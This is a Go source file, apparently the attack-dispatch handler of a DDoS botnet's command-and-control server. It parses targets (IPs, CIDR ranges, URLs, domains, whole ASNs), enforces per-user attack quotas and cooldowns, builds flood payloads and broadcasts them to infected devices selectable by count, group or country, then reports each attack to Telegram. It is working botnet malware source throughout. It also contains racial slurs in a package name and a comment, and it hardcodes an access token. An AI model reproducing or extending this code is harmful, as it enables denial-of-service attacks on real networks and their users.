package flood

import (
	"advanced-telnet-cnc/packages/asn_scraper"
	"advanced-telnet-cnc/packages/filelogging"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/telegram"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"os"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/bogdanovich/dns_resolver"
)

var (
	logger = filelogging.NewLogger("assets/logs/attacks.log")
)

func (method *Method) Handle(session *sessions.Session, args []string, fx *termfx.TermFX) error {
	profile := &AttackProfile{method.ID, 0, make(map[uint32]uint8), make(map[uint8]string)}
	themePath := func(file string) string {
		if session != nil && session.Theme != nil && session.Theme.Name != "" {
			candidate := session.Theme.Name + "/" + file
			if _, err := os.Stat(termfx.Directory + candidate); err == nil {
				return candidate
			}
		}
		if _, err := os.Stat(termfx.Directory + "snow/" + file); err == nil {
			return "snow/" + file
		}
		return "default/" + file
	}

	if len(args) < 2 {
		return ErrWrongSyntax
	}

	/* Checks if the user is allowed to send attacks or not */
	if !session.MethodAllowed(method.ID) {
		return ErrRestrictedMethod
	}

	if !config.Master.Attacks && !session.Admin {
		return ErrAttacksDisabled
	}

	/* Ending of checking if the user can send attacks or not */

	fullTarget := args[0]
	targets := strings.Split(args[0], ",")
	if len(targets) > 255 {
		return ErrTooManyTargets
	}

	for _, target := range targets {
		isHTTP := method.ID == 27 || method.ID == 28

		prefix := ""
		netmask := uint8(32)

		hostPart := target
		pathPart := "/"

		if isHTTP {
			// Prepend protocol if missing for robust parsing
			parseTarget := target
			if !strings.HasPrefix(parseTarget, "http://") && !strings.HasPrefix(parseTarget, "https://") {
				if method.ID == 28 {
					parseTarget = "https://" + parseTarget
				} else {
					parseTarget = "http://" + parseTarget
				}
			}

			u, err := url.Parse(parseTarget)
			if err == nil {
				hostPart = u.Hostname()
				portPart := u.Port()
				pathPart = u.RequestURI()

				if pathPart == "" {
					pathPart = "/"
				}

				// Automatically set related options if provided
				if _, exists := profile.Options[42]; !exists && hostPart != "" {
					profile.Options[42] = hostPart
				}
				if _, exists := profile.Options[41]; !exists && pathPart != "" && pathPart != "/" {
					profile.Options[41] = pathPart
				}
				if portPart != "" {
					if _, exists := profile.Options[7]; !exists {
						profile.Options[7] = portPart
					}
					if _, exists := profile.Options[35]; !exists {
						profile.Options[35] = portPart
					}
				}
			}
			prefix = hostPart
		} else {
			// Strip protocol prefixes if purely IPs are given
			target = strings.TrimPrefix(target, "http://")
			target = strings.TrimPrefix(target, "https://")

			if idx := strings.Index(target, "/"); idx != -1 {
				hostPart = target[:idx]
				pathPart = target[idx:]
			}

			// Detect if pathPart is actually a valid CIDR using strconv
			if pathPart != "/" && len(pathPart) > 1 {
				netmaskTmp, err := strconv.Atoi(pathPart[1:])
				if err == nil && netmaskTmp >= 0 && netmaskTmp <= 32 {
					netmask = uint8(netmaskTmp)
					pathPart = "/" // Revert to root path since it was a CIDR mask
				}
			}

			prefix = hostPart
		}

		ip := net.ParseIP(prefix)
		if ip == nil {
			// Special case for HTTP attacks: we can let the bot resolve it if it's a domain
			if isHTTP {
				// We still set Host option if not already set
				if _, exists := profile.Options[42]; !exists {
					profile.Options[42] = prefix
				}
				// Use 0.0.0.0 as a placeholder to tell the bot to resolve locally
				ip = net.ParseIP("0.0.0.0")
			} else {
				// If it's not a valid IP and not an HTTP attack, try to resolve it as a hostname
				resolver := dns_resolver.New([]string{"1.1.1.1"})
				resolver.RetryTimes = 1
				records, err := resolver.LookupHost(prefix)
				if err != nil || len(records) == 0 {
					return ErrInvalidIP
				}

				// Resolve and add ALL IP addresses found for the domain
				for _, record := range records {
					ipUint32, err := ipToUint32(record)
					if err != nil {
						continue
					}

					if !(session.Reseller || session.Admin) {
						if config.Blacklist.IsBlacklisted(ipUint32, netmask) {
							continue // or return error if you want to be strict
						}
					}
					profile.Targets[ipUint32] = netmask
				}

				// Set the host option automatically if it's a domain & wasn't parsed via URL
				if _, exists := profile.Options[42]; !exists {
					profile.Options[42] = prefix
				}
				continue // Proceed to next target in loop
			}
		}

		// Set the path option automatically if it was part of the target URL or parsed string
		if pathPart != "/" {
			if _, exists := profile.Options[41]; !exists {
				profile.Options[41] = pathPart
			}
		}

		if !(session.Reseller || session.Admin) {
			ipUint32, err := ipToUint32(ip)
			if err != nil {
				return err
			}

			if config.Blacklist.IsBlacklisted(ipUint32, netmask) {
				config.Logger.Info("Blacklisted target", "user", session.Name, "target", ip.String())
				return ErrBlacklistedTarget
			}
		}

		ipUint32, err := ipToUint32(ip)
		if err != nil {
			return err
		}
		profile.Targets[ipUint32] = netmask
	}

	args = args[1:]

	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > session.MaxTime {
		return ErrInvalidDuration
	}

	profile.Duration = duration

	args = args[1:]

	var deviceCount = session.Devices
	var deviceGroup = ""
	var countryVal = ""

	for len(args) > 0 {
		if args[0] == "?" {
			keys := make([]string, 0, len(Options))

			for k, info := range Options {
				if !InSlice(info.ID, method.Options) {
					continue
				}

				keys = append(keys, k)
			}

			sort.Sort(sort.Reverse(sort.StringSlice(keys)))

			for _, key := range keys {
				session.Println(fmt.Sprintf("%s: %s", key, Options[key].Description))
			}

			if InSlice(Options["payload"].ID, method.Options) {
				session.Println(fmt.Sprintf("%s: %s", "preset", "Packet data presets, default is none"))
			}

			session.Println(fmt.Sprintf("%s: %s", "domain", "Domain name to attack, input targets are ignored"))

			return nil
		}

		flagSplit := strings.Split(args[0], "=")
		if len(flagSplit) < 2 || len(flagSplit[1]) < 1 {
			return ErrInvalidOptionCombination
		}

		/* Accept quotes */
		if flagSplit[1][0] == '"' {
			if strings.Count(flagSplit[1], "\"") != 2 {
				return ErrInvalidOptionCombination
			}

			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
		}

		key := flagSplit[0]
		value := flagSplit[1]

		if key == "thread" {
			key = "threads"
		}

		switch key {
		case "count":
			countVal, err := strconv.Atoi(value)
			if err != nil {
				session.Println(config.Red + "Ignored count value due to an invalid integer.")
				continue
			}

			if !session.Admin {
				if countVal > session.Devices {
					deviceCount = session.Devices
				} else {
					deviceCount = countVal
				}
			} else {
				deviceCount = countVal
			}

			args = args[1:]
			continue
		case "group":
			if !(session.Admin || session.Name == "lastdude") {
				args = args[1:]
				continue
			}

			deviceGroup = value
			args = args[1:]
			continue
		case "country":
			deviceGroup = ""
			countryVal = value
			args = args[1:]
			continue
		case "preset":
			xd, exists := PayloadPresets[value]
			if !exists {
				return ErrUnknownOption
			}

			information, ok := Options["payload"]
			if !ok || !InSlice(information.ID, method.Options) {
				return ErrUnknownOption
			}

			profile.Options[information.ID] = xd

			args = args[1:]
			continue
		case "domain":
			profile.Targets = make(map[uint32]uint8)
			resolver := dns_resolver.New([]string{"1.1.1.1"})
			resolver.RetryTimes = 1

			records, err := resolver.LookupHost(value)
			if err != nil {
				return ErrResolvingFail
			}

			type Records struct {
				Length  int
				Records string
			}

			var stringRecords []string
			for _, record := range records {
				stringRecords = append(stringRecords, record.String())
			}

			fx.Execute(themePath("resolved.lufx"), true, fx.Elements(map[string]any{
				"Domain":  value,
				"records": &Records{Records: strings.Join(stringRecords, ", "), Length: len(records)},
			}))

			for _, record := range records {
				ip := net.ParseIP(record.String())
				if ip == nil {
					return ErrInvalidIP
				}

				if !session.Admin {
					ipUint32, err := ipToUint32(ip)
					if err != nil {
						return err
					}

					if config.Blacklist.IsBlacklisted(ipUint32, 32) {
						config.Logger.Info("Blacklisted target", "user", session.Name, "target", ip.String())
						return ErrBlacklistedTarget
					}
				}

				ipUint32, err := ipToUint32(ip)
				if err != nil {
					return err
				}
				profile.Targets[ipUint32] = 32
			}

			args = args[1:]

			continue
		case "asn":
			if !session.Admin {
				return ErrUnknownOption
			}

			_, subnets, err := asn_scraper.NewScraper("ebdf3e5f4f0103").CIDR(flagSplit[1])
			if err != nil {
				return err
			}

			for _, record := range subnets {
				ipUint32, err := ipToUint32(record.Prefix)
				if err != nil {
					return err
				}
				profile.Targets[ipUint32] = uint8(record.Netmask)
			}

			args = args[1:]

			continue
		}

		information, ok := Options[key]
		if !ok || !InSlice(information.ID, method.Options) {
			return ErrUnknownOption
		}

		switch key {
		case "true", "t", "yes": // Boolean
			value = "1"
		case "false", "f", "no": // Boolean
			value = "0"
		}

		if information.Type == reflect.Int && !isNumber(value) {
			return ErrOptionNotAnInt
		} else if information.Type == reflect.Bool && !isBoolean(value) {
			return ErrOptionNotAnBoolean
		}

		if information.Type == reflect.Int {
			intValue, parseErr := strconv.Atoi(value)
			if parseErr != nil {
				return ErrOptionNotAnInt
			}

			if limit(intValue, information) && !session.Admin {
				return ErrOptionOutOfRange
			}
		}

		profile.Options[information.ID] = value

		args = args[1:]
	}

	// Ranges through all the system flags
	for _, system := range Options {
		if !InSlice(system.ID, method.Options) || !system.HasDefault {
			continue
		}

		if _, exists := profile.Options[system.ID]; exists {
			continue
		}

		// dont set default value for minlen & maxlen when len is specified.
		if _, exists := profile.Options[0]; exists && (system.ID == 27 || system.ID == 28) {
			continue
		}

		profile.Options[system.ID] = fmt.Sprint(system.Default)
	}

	created := time.Now()

	lastAttackByAllUsers, err := database.LastFlood()
	if err != nil {
		return err
	}

	lastFlood, err := session.LastFlood()
	if err != nil {
		return err
	}

	running, err := database.RunningAttacks()
	if err != nil {
		return err
	}

	left, _, err := session.Attacks()
	if err != nil {
		return err
	}

	if left <= 0 {
		return ErrNoAttacks
	}

	if len(running) >= config.Master.AttackSlots {
		return ErrSlotsFull
	}

	// fuck you fuck you fuck you fuck you stupid fucking niggerr
	if !session.Admin {
		if lastAttackByAllUsers != nil && lastAttackByAllUsers.End.Add(time.Duration(config.Master.GlobalCooldown)*time.Second).Unix() > time.Now().Unix() {
			return ErrGlobalCooldown
		}
	}

	if lastFlood != nil && lastFlood.End.Add(time.Duration(session.Cooldown)*time.Second).Unix() > time.Now().Unix() && !session.Admin {
		return ErrUserCooldown
	}

	if !session.Admin {
		for h, n := range profile.Targets {
			if Limiter.IsLimited(h, n) {
				return ErrTooManyAttacks
			}
		}
	}

	err = database.LogAttack(&database.Flood{
		Target:   fullTarget,
		Duration: profile.Duration,
		Created:  created,
		Method:   method.Name,
		End:      created.Add(time.Duration(profile.Duration) * time.Second),
	}, session.UserProfile)
	if err != nil {
		fmt.Println(err)
		return err
	}

	logger.Logf("user=%s target=%s duration=%d cooldown=%d method=%s unix=%d", session.Name, fullTarget, profile.Duration, session.Cooldown, method.Name, time.Now().Unix())

	payload, err := profile.CreatePayload()
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
		return err
	}

	devicesSentTo := niggers.BroadcastAttack(payload, deviceGroup, countryVal, deviceCount)

	telegram.Send(fmt.Sprintf("[!] Attack has been sent: name=%s, targets=%s, devices=%d, method=%s, timestamp=%s", session.Name, fullTarget, devicesSentTo, method.Name, time.Now().Format(time.RFC822)))

	if !session.Admin {
		for h, n := range profile.Targets {
			Limiter.Add(h, n)
		}
	}

	return fx.Execute(themePath("broadcasted.lufx"), true, fx.Elements(map[string]any{
		"Devices":   devicesSentTo,
		"Target":    fullTarget,
		"Duration":  duration,
		"Method":    method.Name,
		"Timestamp": time.Now().Format(time.RFC822),
	}))
}

func isNumber(value string) bool {
	_, err := strconv.ParseFloat(value, 64)
	return err == nil
}

func isBoolean(value string) bool {
	_, err := strconv.ParseBool(value)
	return err == nil
}

func limit(value int, option Option) bool {
	if option.Maximum == 0 {
		return false
	}

	return value > option.Maximum || value < option.Minimum
}

func ipToUint32(ip net.IP) (uint32, error) {
	ip4 := ip.To4()
	if ip4 == nil {
		return 0, ErrInvalidIP
	}

	return binary.BigEndian.Uint32(ip4), nil
}
